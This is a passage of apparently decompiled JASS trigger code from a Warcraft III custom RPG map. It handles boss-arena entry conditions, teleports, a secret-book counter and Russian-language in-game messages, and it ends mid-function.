function Byv takes nothing returns nothing
set Uv=CreateTrigger()
call DisableTrigger(Uv)
call TriggerRegisterEnterRectSimple(Uv,Cw)
call TriggerAddCondition(Uv,Condition(function Byp))
call TriggerAddAction(Uv,function Byu)
endfunction
function Byw takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930504E) then
return false
endif
return true
endfunction
function Byx takes nothing returns boolean
if not (SQ==7) then
return false
endif
return true
endfunction
function Byy takes nothing returns nothing
set SQ=SQ+1
call DisplayTextToForce(GetPlayersAll(),"|c00ff9696Секретных книг найдено: |r"+(I2S(SQ)+"/7"))
if Byx() then
call DisplayTextToForce(GetPlayersAll(),"|c00ff9696Теперь вы можете попасть в Древнюю библиотеку и сразиться с Хранительницей. Вход с 38 уровня!")
call EnableTrigger(Uv)
else
endif
endfunction
function Byz takes nothing returns nothing
set hp=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(hp,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddCondition(hp,Condition(function Byw))
call TriggerAddAction(hp,function Byy)
endfunction
function By0 takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (GetUnitLevel(GetEnteringUnit())>=40) then
return false
endif
return true
endfunction
function By1 takes nothing returns boolean
if GetUnitTypeId(GetEnumUnit())==$68303231 then
return true
endif
if GetUnitTypeId(GetEnumUnit())==$68303230 then
return true
endif
if GetUnitTypeId(GetEnumUnit())==$6830315A then
return true
endif
if GetUnitTypeId(GetEnumUnit())==$68303232 then
return true
endif
return false
endfunction
function By2 takes nothing returns boolean
if not By1() then
return false
endif
return true
endfunction
function By3 takes nothing returns nothing
if By2() then
call RemoveUnit(GetEnumUnit())
else
endif
endfunction
function By4 takes nothing returns nothing
local integer L9=0
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
set YV[124]=GetRectCenter(Cq)
call SetUnitPositionLoc(GetTriggerUnit(),YV[124])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[124],0.)
call SetUnitLifePercentBJ(LU,100)
call ShowUnitShow(LU)
call PauseUnit(LU,false)
call SetUnitOwner(LU,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(LU,true)
set SP=0
call EnableTrigger(fh)
call ForGroupBJ(GetUnitsInRectAll(Cs),function By3)
call RemoveLocation(YV[124])
call SaveInteger(NY,GetHandleId(LU),1,0)
loop
call SaveInteger(NY,GetHandleId(LU),2+L9,0)
set L9=L9+1
exitwhen L9==7
endloop
endfunction
function By5 takes nothing returns nothing
set Uw=CreateTrigger()
call TriggerRegisterEnterRectSimple(Uw,Cr)
call TriggerAddCondition(Uw,Condition(function By0))
call TriggerAddAction(Uw,function By4)
endfunction
function By6 takes nothing returns nothing
call DisplayTextToForce(GetPlayersAll(),"Завалы разрушены!")
call KillDestructable(HH)
call KillDestructable(HP)
call KillDestructable(HQ)
call KillDestructable(HN)
call KillDestructable(HL)
call KillDestructable(HK)
call KillDestructable(HO)
call KillDestructable(HM)
endfunction
function By7 takes nothing returns nothing
set hq=CreateTrigger()
call TriggerRegisterDeathEvent(hq,Ha)
call TriggerAddAction(hq,function By6)
endfunction
function By8 takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303737))==true) then
return false
endif
return true
endfunction
function By9 takes nothing returns nothing
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303737))
call EnableTrigger(hs)
call DisplayTextToForce(GetPlayersAll(),"|c00ff00ffВы открыли проход к секретному боссу!!!")
endfunction
function BzB takes nothing returns nothing
set hr=CreateTrigger()
call TriggerRegisterEnterRectSimple(hr,Cm)
call TriggerAddCondition(hr,Condition(function By8))
call TriggerAddAction(hr,function By9)
endfunction
function BzC takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BzD takes nothing returns nothing
local integer L9=0
call SetUnitLifePercentBJ(LR,100)
call SetUnitAbilityLevel(LR,$4130484C,1)
call SetUnitOwner(LR,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(LR,true)
set YV[121]=GetRectCenter(Cn)
call SetUnitPositionLoc(GetTriggerUnit(),YV[121])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[121],0.)
call RemoveLocation(YV[121])
call SaveInteger(NY,GetHandleId(LR),1,0)
loop
call SaveInteger(NY,GetHandleId(LR),2+L9,0)
set L9=L9+1
exitwhen L9==7
endloop
endfunction
function BzE takes nothing returns nothing
set hs=CreateTrigger()
call DisableTrigger(hs)
call TriggerRegisterEnterRectSimple(hs,Cm)
call TriggerAddCondition(hs,Condition(function BzC))
call TriggerAddAction(hs,function BzD)
endfunction
function BzF takes nothing returns boolean
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BzG takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(20.)
if BzF() then
set YV[122]=GetRandomLocInRect(Co)
set YV[123]=GetRectCenter(Cp)
call DisplayTextToForce(GetPlayersAll(),"|c006969ffА вот и я!")
call CreateNUnitsAtLoc(1,$6E303446,Player(PLAYER_NEUTRAL_AGGRESSIVE),YV[122],bj_UNIT_FACING)
call IssuePointOrderLoc(GetLastCreatedUnit(),"move",YV[123])
call RemoveLocation(YV[122])
call RemoveLocation(YV[123])
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function BzH takes nothing returns nothing
set ht=CreateTrigger()
call TriggerRegisterUnitEvent(ht,LR,EVENT_UNIT_DAMAGED)
call TriggerAddAction(ht,function BzG)
endfunction
function BzI takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E303446) then
return false
endif
return true
endfunction
function BzJ takes nothing returns nothing
call RemoveUnit(GetTriggerUnit())
call IncUnitAbilityLevelSwapped($4130484C,LR)
call AddSpecialEffectTargetUnitBJ("overhead",LR,"Abilities\\Spells\\Undead\\DeathCoil\\DeathCoilSpecialArt.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
endfunction
function BzK takes nothing returns nothing
set hu=CreateTrigger()
call TriggerRegisterEnterRectSimple(hu,Cp)
call TriggerAddCondition(hu,Condition(function BzI))
call TriggerAddAction(hu,function BzJ)
endfunction
function BzL takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BzM takes nothing returns nothing
local integer L9=0
call SetUnitPositionLoc(GetTriggerUnit(),Location(-15745.,9570.))
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),Location(-15745.,9570.),0.)
call SetUnitLifePercentBJ(Lh,100)
call SetUnitOwner(Lh,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Lh,true)
call SetUnitLifePercentBJ(Vd[1],100)
call SetUnitOwner(Vd[1],Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Vd[1],true)
call SaveInteger(NY,GetHandleId(Lh),1,0)
call SaveInteger(NY,GetHandleId(Vd[1]),1,0)
loop
call SaveInteger(NY,GetHandleId(Lh),2+L9,0)
call SaveInteger(NY,GetHandleId(Vd[1]),2+L9,0)
set L9=L9+1
exitwhen L9==7
endloop
endfunction
function BzN takes nothing returns nothing
set Vg=CreateTrigger()
call TriggerRegisterEnterRectSimple(Vg,Ck)
call TriggerAddCondition(Vg,Condition(function BzL))
call TriggerAddAction(Vg,function BzM)
endfunction
function BzO takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BzP takes nothing returns nothing
local integer L9=0
call SetUnitPositionLoc(GetTriggerUnit(),Location(-15745.,11440.))
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),Location(-15745.,11440.),0.)
call SetUnitLifePercentBJ(Li,100)
call SetUnitOwner(Li,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Li,true)
call SetUnitLifePercentBJ(Vd[2],100)
call SetUnitOwner(Vd[2],Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Vd[2],true)
call SaveInteger(NY,GetHandleId(Li),1,0)
call SaveInteger(NY,GetHandleId(Vd[2]),1,0)
loop
call SaveInteger(NY,GetHandleId(Li),2+L9,0)
call SaveInteger(NY,GetHandleId(Vd[2]),2+L9,0)
set L9=L9+1
exitwhen L9==7
endloop
endfunction
function BzQ takes nothing returns nothing
set Vh=CreateTrigger()
call TriggerRegisterEnterRectSimple(Vh,Cl)
call TriggerAddCondition(Vh,Condition(function BzO))
call TriggerAddAction(Vh,function BzP)
endfunction
function BzR takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BzS takes nothing returns nothing
set YV[111]=GetRectCenter(N)
call SetUnitPositionLoc(GetTriggerUnit(),YV[111])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[111],0.)
call RemoveLocation(YV[111])
endfunction
function BzT takes nothing returns nothing
set Ug=CreateTrigger()
call DisableTrigger(Ug)
call TriggerRegisterEnterRectSimple(Ug,Cg)
call TriggerAddCondition(Ug,Condition(function BzR))
call TriggerAddAction(Ug,function BzS)
endfunction
function BzU takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BzV takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00ff7f00Давно я ждал гостей. Тех, кто не испугается моего облика, кто будет со мной дружить... Я так одинок. Никто, никто не хочет со мной общаться!!! Разве я так много прошу? Давайте поиграем?|r")
call TriggerSleepAction(8.)
call ShowUnitShow(LB)
endfunction
function BzW takes nothing returns nothing
set hv=CreateTrigger()
call TriggerRegisterEnterRectSimple(hv,Ge)
call TriggerAddCondition(hv,Condition(function BzU))
call TriggerAddAction(hv,function BzV)
endfunction
function BzX takes nothing returns boolean
if not (IsUnitType(GetEnteringUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BzY takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303130
endfunction
function BzZ takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function Bza takes nothing returns boolean
return GetBooleanAnd(BzY(),BzZ())
endfunction
function Bzb takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Bzc takes nothing returns boolean
if not (GetUnitLevel(GetEnteringUnit())>=28) then
return false
endif
return true
endfunction
function Bzd takes nothing returns nothing
local integer Mc
if Bzc() then
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,x)
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
set TN[0]=75
set TN[2]=85
set V0=GetRectCenter(Ce)
call SetUnitPositionLocFacingBJ(K9,V0,270.)
call SetUnitOwner(K9,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(K9,true)
call RemoveLocation(V0)
set YV[92]=Location(8816.,-24071.)
call SetUnitPositionLoc(GetEnteringUnit(),YV[92])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetEnteringUnit()),YV[92],0)
call SetUnitLifePercentBJ(K9,100)
call SetUnitLifePercentBJ(GetEnteringUnit(),100)
call SetUnitManaPercentBJ(GetEnteringUnit(),100)
call ShowUnit(KG,false)
call ShowUnit(K9,true)
call EnableTrigger(gC)
call EnableTrigger(f9)
call SaveInteger(NY,GetHandleId(K9),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(K9),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
set SR=GetUnitsInRectMatching(x,Condition(function Bza))
call ForGroupBJ(SR,function Bzb)
call DestroyGroup(SR)
else
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Для входа требуется 28 уровень!|r")
endif
call RemoveLocation(YV[92])
endfunction
function Bze takes nothing returns nothing
set Zq=CreateTrigger()
call DisableTrigger(Zq)
call TriggerRegisterEnterRectSimple(Zq,y)
call TriggerAddCondition(Zq,Condition(function BzX))
call TriggerAddAction(Zq,function Bzd)
endfunction
function Bzf takes nothing returns boolean
if not (IsUnitType(GetEnteringUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bzg takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303130
endfunction
function Bzh takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function Bzi takes nothing returns boolean
return GetBooleanAnd(Bzg(),Bzh())
endfunction
function Bzj takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Bzk takes nothing returns boolean
if not (GetUnitLevel(GetEnteringUnit())>=28) then
return false
endif
return true
endfunction
function Bzl takes nothing returns nothing
local integer Mc
if Bzk() then
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,x)
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
set TN[0]=75
set TN[1]=90
set TN[2]=85
set V0=GetRectCenter(Ce)
call SetUnitPositionLocFacingBJ(K9,V0,270.)
call SetUnitOwner(K9,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(K9,true)
call RemoveLocation(V0)
set YV[92]=Location(8816.,-24071.)
call SetUnitPositionLoc(GetEnteringUnit(),YV[92])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetEnteringUnit()),YV[92],0)
call SetUnitLifePercentBJ(K9,100)
call SetUnitLifePercentBJ(GetEnteringUnit(),100)
call SetUnitManaPercentBJ(GetEnteringUnit(),100)
call ShowUnit(KG,false)
call ShowUnit(K9,true)
call EnableTrigger(gC)
call EnableTrigger(f7)
call EnableTrigger(f8)
call EnableTrigger(gB)
call SaveInteger(NY,GetHandleId(K9),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(K9),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
set SR=GetUnitsInRectMatching(x,Condition(function Bzi))
call ForGroupBJ(SR,function Bzj)
call DestroyGroup(SR)
else
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Для входа требуется 28 уровень!|r")
endif
call RemoveLocation(YV[92])
endfunction
function Bzm takes nothing returns nothing
set Zr=CreateTrigger()
call DisableTrigger(Zr)
call TriggerRegisterEnterRectSimple(Zr,y)
call TriggerAddCondition(Zr,Condition(function Bzf))
call TriggerAddAction(Zr,function Bzl)
endfunction
function Bzn takes nothing returns boolean
if not (IsUnitType(GetEnteringUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bzo takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bzp takes nothing returns boolean
return GetUnitLevel(GetFilterUnit())>=43
endfunction
function Bzq takes nothing returns boolean
return GetBooleanAnd(Bzo(),Bzp())
endfunction
function Bzr takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303130
endfunction
function Bzs takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function Bzt takes nothing returns boolean
return GetBooleanAnd(Bzr(),Bzs())
endfunction
function Bzu takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Bzv takes nothing returns boolean
if not (GetUnitLevel(GetEnteringUnit())>=43) then
return false
endif
if not (GetPlayerState(GetOwningPlayer(GetTriggerUnit()),PLAYER_STATE_RESOURCE_LUMBER)>=2700) then
return false
endif
return true
endfunction
function Bzw takes nothing returns boolean
if not (CountUnitsInGroup(SR)>=4) then
return false
endif
return true
endfunction
function Bzx takes nothing returns nothing
local integer Mc
set SR=GetUnitsInRectMatching(GetWorldBounds(),Condition(function Bzq))
if Bzw() then
if Bzv() then
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,x)
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
set TN[0]=75
set TN[1]=90
set TN[2]=82
set TN[3]=75
set TN[4]=85
set V0=GetRectCenter(Ce)
call SetUnitPositionLocFacingBJ(K9,V0,270.)
call SetUnitOwner(K9,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(K9,true)
call RemoveLocation(V0)
set YV[92]=Location(8816.,-24071.)
call SetUnitPositionLoc(GetEnteringUnit(),YV[92])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetEnteringUnit()),YV[92],0)
call SetUnitLifePercentBJ(K9,100)
call SetUnitLifePercentBJ(GetEnteringUnit(),100)
call SetUnitManaPercentBJ(GetEnteringUnit(),100)
call PauseUnit(K9,false)
call SetUnitInvulnerable(K9,true)
call ShowUnit(KG,false)
call ShowUnit(K9,true)
call EnableTrigger(gC)
call EnableTrigger(f7)
call EnableTrigger(f8)
call EnableTrigger(gB)
call EnableTrigger(gE)
call EnableTrigger(gF)
call EnableTrigger(gG)
call EnableTrigger(gH)
call SaveInteger(NY,GetHandleId(K9),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(K9),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_ALWAYSHINT,"|c00ff0000ВНИМАНИЕ: если в момент смерти Босса в игре будет лишь один игрок, Вам засчитают поражение.")
set SR=GetUnitsInRectMatching(x,Condition(function Bzt))
call ForGroupBJ(SR,function Bzu)
call DestroyGroup(SR)
else
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Для входа требуется 43 уровень и звание \"Капитан ТСоМ\"(2700 очков)!|r")
endif
else
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Слишком мало Героев выше 43 уровня!|r")
endif
call RemoveLocation(YV[92])
call DestroyGroup(SR)
endfunction
function Bzy takes nothing returns nothing
set eM=CreateTrigger()
call DisableTrigger(eM)
call TriggerRegisterEnterRectSimple(eM,y)
call TriggerAddCondition(eM,Condition(function Bzn))
call TriggerAddAction(eM,function Bzx)
endfunction
function Bzz takes nothing returns nothing
local unit X1=GetEnumUnit()
call RemoveUnit(X1)
set X1=null
endfunction
function Bz0 takes nothing returns boolean
if GetUnitTypeId(GetFilterUnit())!=$6E30304A then
if IsUnitEnemy(GetFilterUnit(),Player(0))==true then
return true
endif
endif
return false
endfunction
function Bz1 takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Mc
local integer No
local group Np
local boolexpr Nt
if IsUnitType(Hu,UNIT_TYPE_HERO)==true then
if GetUnitLevel(Hu)>=11 then
set Mc=K1
call EnableTrigger(hx)
call UnitRemoveAbility(Mc,$4131394B)
call UnitRemoveAbility(Mc,$4131394A)
call SaveInteger(NY,GetHandleId(Mc),1,0)
set No=0
loop
call SaveInteger(NY,GetHandleId(Mc),2+No,0)
set No=No+1
exitwhen No==7
endloop
if d8[1]==1 then
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,Gd)
call SetUnitFacing(Mc,90.)
call SetUnitOwner(Mc,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Mc,true)
call SetUnitPosition(Mc,1338,-23726)
if GetLocalPlayer()==GetOwningPlayer(Hu) then
call PanCameraToTimed(1338,-23051,0)
call DisplayTextToPlayer(GetLocalPlayer(),0,0,"Для начала боя с боссом нажмите |c00ff0000Esc")
endif
call SetUnitPosition(Hu,1338,-23051)
call SetUnitState(Mc,UNIT_STATE_LIFE,GetUnitState(Mc,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MAX_MANA)*RMaxBJ(0,100)*.01)
set Np=CreateGroup()
set Nt=Condition(function Bz0)
call GroupEnumUnitsInRect(Np,Gd,Nt)
call DestroyBoolExpr(Nt)
call ForGroup(Np,function Bzz)
call DestroyGroup(Np)
set Nt=null
set Np=null
endif
if d8[1]==2 then
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,Gd)
call SetUnitFacing(Mc,90.)
call SetUnitOwner(Mc,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Mc,true)
call SetUnitPosition(Mc,1338,-23726)
if GetLocalPlayer()==GetOwningPlayer(Hu) then
call PanCameraToTimed(1338,-23051,0)
call DisplayTextToPlayer(GetLocalPlayer(),0,0,"Для начала боя с боссом нажмите |c00ff0000Esc")
endif
call SetUnitPosition(Hu,1338,-23051.)
call SetUnitState(Mc,UNIT_STATE_LIFE,GetUnitState(Mc,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MAX_MANA)*RMaxBJ(0,100)*.01)
set Np=CreateGroup()
set Nt=Condition(function Bz0)
call GroupEnumUnitsInRect(Np,Gd,Nt)
call DestroyBoolExpr(Nt)
call ForGroup(Np,function Bzz)
call DestroyGroup(Np)
set Nt=null
set Np=null
endif
if d8[1]==3 then
if GetUnitLevel(Hu)>=35 then
if GetPlayerState(GetOwningPlayer(Hu),PLAYER_STATE_RESOURCE_LUMBER)>=0 then
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,Gd)
set TK[2]=99
call SetUnitVertexColor(Mc,255,0,255,200)
call SetUnitFacing(Mc,90.)
call SetUnitOwner(Mc,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Mc,true)
call SetUnitPosition(Mc,1338,-23726)
if GetLocalPlayer()==GetOwningPlayer(Hu) then
call PanCameraToTimed(1338,-23051,0)
call DisplayTextToPlayer(GetLocalPlayer(),0,0,"Для начала боя с боссом нажмите |c00ff0000Esc")
endif
call SetUnitPosition(Hu,1338,-23051.)
call SetUnitState(Mc,UNIT_STATE_LIFE,GetUnitState(Mc,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MAX_MANA)*RMaxBJ(0,100)*.01)
set Np=CreateGroup()
set Nt=Condition(function Bz0)
call GroupEnumUnitsInRect(Np,Gd,Nt)
call DestroyBoolExpr(Nt)
call ForGroup(Np,function Bzz)
call DestroyGroup(Np)
set Nt=null
set Np=null
endif
endif
endif
set Mc=null
endif
endif
set Hu=null
endfunction
function Bz2 takes nothing returns nothing
local trigger hw=CreateTrigger()
call TriggerRegisterEnterRectSimple(hw,GP)
call TriggerAddAction(hw,function Bz1)
set hw=null
endfunction
function Bz3 takes nothing returns boolean
if GetUnitTypeId(GetFilterUnit())!=$6E30304F then
if IsUnitEnemy(GetFilterUnit(),Player(0))==true then
return true
endif
endif
return false
endfunction
function Bz4 takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Mc
local integer No
local group Np
local boolexpr Nt
if IsUnitType(Hu,UNIT_TYPE_HERO)==true then
if GetUnitLevel(Hu)>=14 then
set Mc=Kv
call SaveInteger(NY,GetHandleId(Mc),1,0)
set No=0
loop
call SaveInteger(NY,GetHandleId(Mc),2+No,0)
set No=No+1
exitwhen No==7
endloop
if d8[2]==1 then
set TL[0]=90
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,J)
call SetUnitPosition(Mc,3598,-22487)
call SetUnitFacing(Mc,90.)
call SetUnitOwner(Mc,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Mc,true)
if GetLocalPlayer()==GetOwningPlayer(Hu) then
call PanCameraToTimed(3598,-21727,0)
endif
call SetUnitPosition(Hu,3598,-21727)
call SetUnitState(Mc,UNIT_STATE_LIFE,GetUnitState(Mc,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MAX_MANA)*RMaxBJ(0,100)*.01)
set Np=CreateGroup()
set Nt=Condition(function Bz3)
call GroupEnumUnitsInRect(Np,J,Nt)
call DestroyBoolExpr(Nt)
call ForGroup(Np,function Bzz)
call DestroyGroup(Np)
set Nt=null
set Np=null
endif
if d8[2]==2 then
set TL[0]=90
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,J)
call SetUnitPosition(Mc,3598,-22487)
call SetUnitFacing(Mc,90.)
call SetUnitOwner(Mc,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Mc,true)
if GetLocalPlayer()==GetOwningPlayer(Hu) then
call PanCameraToTimed(3598,-21727,0)
endif
call SetUnitPosition(Hu,3598,-21727)
call SetUnitState(Mc,UNIT_STATE_LIFE,GetUnitState(Mc,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MAX_MANA)*RMaxBJ(0,100)*.01)
set Np=CreateGroup()
set Nt=Condition(function Bz3)
call GroupEnumUnitsInRect(Np,J,Nt)
call DestroyBoolExpr(Nt)
call ForGroup(Np,function Bzz)
call DestroyGroup(Np)
set Nt=null
set Np=null
endif
if d8[2]==3 then
if GetUnitLevel(Hu)>=38 then
if GetPlayerState(GetOwningPlayer(Hu),PLAYER_STATE_RESOURCE_LUMBER)>=0 then
set TL[0]=90
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,J)
call SetUnitPosition(Mc,3598,-22487)
call SetUnitFacing(Mc,90.)
call SetUnitOwner(Mc,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Mc,true)
if GetLocalPlayer()==GetOwningPlayer(Hu) then
call PanCameraToTimed(3598,-21727,0)
endif
call SetUnitPosition(Hu,3598,-21727)
call SetUnitState(Mc,UNIT_STATE_LIFE,GetUnitState(Mc,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MAX_MANA)*RMaxBJ(0,100)*.01)
set Np=CreateGroup()
set Nt=Condition(function Bz3)
call GroupEnumUnitsInRect(Np,J,Nt)
call DestroyBoolExpr(Nt)
call ForGroup(Np,function Bzz)
call DestroyGroup(Np)
set Nt=null
set Np=null
endif
endif
endif
set Mc=null
endif
endif
set Hu=null
endfunction
function Bz5 takes nothing returns nothing
local trigger hy=CreateTrigger()
call TriggerRegisterEnterRectSimple(hy,b)
call TriggerAddAction(hy,function Bz4)
set hy=null
endfunction
function Bz6 takes nothing returns boolean
if GetUnitTypeId(GetFilterUnit())!=$6E303052 then
if IsUnitEnemy(GetFilterUnit(),Player(0))==true then
return true
endif
endif
return false
endfunction
function Bz7 takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Mc
local integer No
local group Np
local boolexpr Nt
if IsUnitType(Hu,UNIT_TYPE_HERO)==true then
if GetUnitLevel(Hu)>=22 then
set Mc=K5
call SaveInteger(NY,GetHandleId(Mc),1,0)
set No=0
loop
call SaveInteger(NY,GetHandleId(Mc),2+No,0)
set No=No+1
exitwhen No==7
endloop
if d8[3]==1 then
set TM[0]=90
set fo[1]=95
set fo[2]=90
call UnitRemoveAbility(K5,$41303736)
call UnitRemoveAbility(K5,$41436D33)
call EnableTrigger(h0)
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,BD)
